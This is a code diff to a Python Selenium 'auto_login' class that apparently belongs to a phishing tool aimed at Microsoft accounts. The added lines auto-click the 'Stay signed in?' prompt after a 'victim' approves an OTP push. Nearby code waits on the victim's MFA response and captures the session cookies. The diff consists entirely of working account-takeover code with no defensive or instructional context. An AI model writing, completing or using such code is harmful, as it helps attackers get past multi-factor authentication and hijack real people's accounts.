@@ -134,6 +134,17 @@ class auto_login:
             # time.sleep(10)
             while True:
                 time.sleep(1)
+                if "Stay signed in?" in self.driver.page_source:
+                    # print("[+] Victim didn't click")
+                    self.set_return("OTP_submited_stay_signedin")
+                    # an extra wait to for the button to become clickable
+                    time.sleep(2) 
+                    staysigned_in_element = self.driver.find_element(
+                        by=By.ID, value="idSIButton9"
+                    )
+                    staysigned_in_element.click()
+                    self.set_return("OTP_submited_stay_signedin_clicked")
+                    break
                 if "We didn't hear from you" in self.driver.page_source:
                     print("[+] Victim didn't click")
                     self.set_return("OTP_timeout")
@@ -143,7 +154,6 @@ class auto_login:
                     self.set_return("OTP_submited")
                     break
         return self.return_json
-
 
     def set_chrome_options() -> Options:
         """Sets chrome options for Selenium.
@@ -157,6 +167,7 @@ class auto_login:
         chrome_options.experimental_options["prefs"] = chrome_prefs
         chrome_prefs["profile.default_content_settings"] = {"images": 2}
         return chrome_options
+
     def get_cookies(self):
         print("[+] cookies captured: ")
         self.set_return("Capturing cookies")
